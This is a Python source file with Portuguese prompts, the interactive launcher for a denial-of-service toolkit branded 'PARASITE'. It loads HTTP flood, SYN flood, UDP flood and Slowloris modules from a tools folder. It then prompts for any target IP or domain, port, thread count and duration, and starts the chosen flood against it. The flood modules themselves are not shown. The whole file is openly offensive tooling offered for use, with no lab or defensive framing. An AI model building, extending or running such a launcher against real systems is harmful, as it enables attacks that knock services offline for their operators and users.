#!/usr/bin/env python3
# main.py - Interface interativa para ferramentas DoS

import os
import sys
import time
from colorama import init, Fore, Style

# Configurar path para encontrar os módulos
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# Dicionário para armazenar módulos disponíveis
MODULOS = {}

# Tentar importar HTTP Flood
try:
    from tools.http_flood import HTTPFlood
    MODULOS['http'] = {'nome': 'HTTP Flood', 'classe': HTTPFlood, 'porta_padrao': 80}
    print(f"{Fore.GREEN}✅ HTTP Flood carregado")
except ImportError as e:
    print(f"{Fore.YELLOW}⚠️ HTTP Flood não disponível: {e}")

# Tentar importar SYN Flood
try:
    from tools.syn_flood import SYNFlood
    MODULOS['syn'] = {'nome': 'SYN Flood', 'classe': SYNFlood, 'porta_padrao': 80}
    print(f"{Fore.GREEN}✅ SYN Flood carregado")
except ImportError as e:
    print(f"{Fore.YELLOW}⚠️ SYN Flood não disponível: {e}")

# Tentar importar UDP Flood
try:
    from tools.udp_flood import UDPFlood
    MODULOS['udp'] = {'nome': 'UDP Flood', 'classe': UDPFlood, 'porta_padrao': 53}
    print(f"{Fore.GREEN}✅ UDP Flood carregado")
except ImportError as e:
    print(f"{Fore.YELLOW}⚠️ UDP Flood não disponível: {e}")

# Tentar importar Slowloris
try:
    from tools.slowloris import Slowloris
    MODULOS['slowloris'] = {'nome': 'Slowloris', 'classe': Slowloris, 'porta_padrao': 80}
    print(f"{Fore.GREEN}✅ Slowloris carregado")
except ImportError as e:
    print(f"{Fore.YELLOW}⚠️ Slowloris não disponível: {e}")

init(autoreset=True)

def limpar_tela():
    """Limpa o terminal"""
    os.system('clear' if os.name == 'posix' else 'cls')


def mostrar_banner():
    """Mostra o banner do programa"""
    banner = f"""
{Fore.RED}
██████╗  █████╗ ██████╗  █████╗ ███████╗██╗████████╗███████╗
██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██║╚══██╔══╝██╔════╝
██████╔╝███████║██████╔╝███████║███████╗██║   ██║   █████╗
██╔═══╝ ██╔══██║██╔══██╗██╔══██║╚════██║██║   ██║   ██╔══╝
██║     ██║  ██║██║  ██║██║  ██║███████║██║   ██║   ███████╗
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝   ╚═╝   ╚══════╝
{Style.RESET_ALL}
{Fore.YELLOW}
╔════════════════════════════════════════════════════════════════╗
║                         PARASITE                               ║
║                         by: azrael                             ║
╚════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""
    print(banner)
    print(f"{Fore.CYAN}📅 Data: {time.strftime('%d/%m/%Y %H:%M:%S')}")
    print(f"{Fore.CYAN}🔧 Módulos carregados: {len(MODULOS)}/{len(MODULOS)}")
    print()
def mostrar_menu():
    """Mostra o menu principal"""
    print(f"{Fore.GREEN}╔════════════════════════════════════╗")
    print(f"║           MENU PRINCIPAL            ║")
    print(f"╠════════════════════════════════════╣")
    
    # Listar módulos disponíveis
    opcoes = list(MODULOS.keys())
    for i, (chave, modulo) in enumerate(MODULOS.items(), 1):
        print(f"║  {Fore.YELLOW}[{i}]{Fore.GREEN} {modulo['nome']:<32}║")
    
    print(f"║  {Fore.YELLOW}[0]{Fore.GREEN} Sair                           ║")
    print(f"╚════════════════════════════════════╝{Style.RESET_ALL}")
    
    return opcoes

def obter_parametros(modulo):
    """Obtém parâmetros do usuário para o ataque"""
    print(f"\n{Fore.CYAN}🔧 Configurando {modulo['nome']}...\n")
    
    # Alvo
    alvo = input(f"{Fore.CYAN}🎯 Alvo (IP ou domínio): {Style.RESET_ALL}")
    if not alvo:
        print(f"{Fore.RED}❌ Alvo não informado!")
        return None
    
    # Porta
    try:
        porta_str = input(f"{Fore.CYAN}🔌 Porta [padrão: {modulo['porta_padrao']}]: {Style.RESET_ALL}")
        porta = int(porta_str) if porta_str else modulo['porta_padrao']
    except:
        porta = modulo['porta_padrao']
    
    # Threads
    try:
        threads_str = input(f"{Fore.CYAN}🧵 Threads [padrão: 50]: {Style.RESET_ALL}")
        threads = int(threads_str) if threads_str else 50
    except:
        threads = 50
    
    # Duração
    try:
        duracao_str = input(f"{Fore.CYAN}⏱️  Duração em segundos [padrão: 30]: {Style.RESET_ALL}")
        duracao = int(duracao_str) if duracao_str else 30
    except:
        duracao = 30
    
    return {
        'alvo': alvo,
        'porta': porta,
        'threads': threads,
        'duracao': duracao
    }

def confirmar_ataque(modulo, params):
    """Mostra resumo e pede confirmação"""
    print(f"\n{Fore.RED}╔════════════════════════════════════╗")
    print(f"║       CONFIRMAR ATAQUE            ║")
    print(f"╠════════════════════════════════════╣")
    print(f"║ Tipo: {modulo['nome']:<31} ║")
    print(f"║ Alvo: {params['alvo']:<31} ║")
    print(f"║ Porta: {params['porta']:<30} ║")
    print(f"║ Threads: {params['threads']:<29} ║")
    print(f"║ Duração: {params['duracao']}s {' ' * 24}║")
    print(f"╚════════════════════════════════════╝{Style.RESET_ALL}")
    
    if modulo['nome'] == 'SYN Flood':
        print(f"{Fore.YELLOW}⚠️  SYN Flood requer privilégios de root!")
    
    resp = input(f"\n{Fore.YELLOW}Iniciar ataque? (s/N): {Style.RESET_ALL}")
    return resp.lower() == 's'

def executar_ataque(modulo, params):
    """Executa o ataque escolhido"""
    try:
        # Criar instância da classe de ataque
        if modulo['nome'] == 'HTTP Flood':
            # HTTP Flood usa URL completa
            if not params['alvo'].startswith(('http://', 'https://')):
                params['alvo'] = 'http://' + params['alvo']
            ataque = modulo['classe'](
                target=params['alvo'],
                threads=params['threads'],
                duration=params['duracao']
            )
        else:
            # Outros ataques usam IP e porta
            ataque = modulo['classe'](
                target_ip=params['alvo'],
                target_port=params['porta'],
                threads=params['threads'],
                duration=params['duracao']
            )
        
        # Iniciar ataque
        ataque.start()
        
    except PermissionError:
        print(f"{Fore.RED}❌ Permissão negada! Execute com sudo para SYN Flood.")
    except Exception as e:
        print(f"{Fore.RED}❌ Erro ao executar ataque: {e}")
    
    input(f"\n{Fore.CYAN}Pressione Enter para voltar ao menu...{Style.RESET_ALL}")

def main():
    """Função principal"""
    while True:
        limpar_tela()
        mostrar_banner()
        
        if not MODULOS:
            print(f"{Fore.RED}❌ Nenhum módulo carregado!")
            print(f"{Fore.YELLOW}Verifique se os arquivos na pasta tools/ existem:")
            print("  - http_flood.py")
            print("  - syn_flood.py")
            print("  - udp_flood.py")
            print("  - slowloris.py")
            print(f"\n{Fore.CYAN}E também o arquivo tools/__init__.py")
            break
        
        opcoes = mostrar_menu()
        
        try:
            escolha = input(f"\n{Fore.CYAN}📌 Escolha uma opção: {Style.RESET_ALL}")
            
            if escolha == '0':
                print(f"\n{Fore.GREEN}👋 Até mais!")
                break
            
            # Converter escolha para índice
            idx = int(escolha) - 1
            if 0 <= idx < len(opcoes):
                chave = opcoes[idx]
                modulo = MODULOS[chave]
                
                # Obter parâmetros
                params = obter_parametros(modulo)
                if params and confirmar_ataque(modulo, params):
                    executar_ataque(modulo, params)
            else:
                print(f"{Fore.RED}❌ Opção inválida!")
                time.sleep(1)
                
        except ValueError:
            print(f"{Fore.RED}❌ Digite um número válido!")
            time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}👋 Até mais!")
            break
        except Exception as e:
            print(f"{Fore.RED}❌ Erro: {e}")
            time.sleep(2)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}👋 Programa encerrado!")
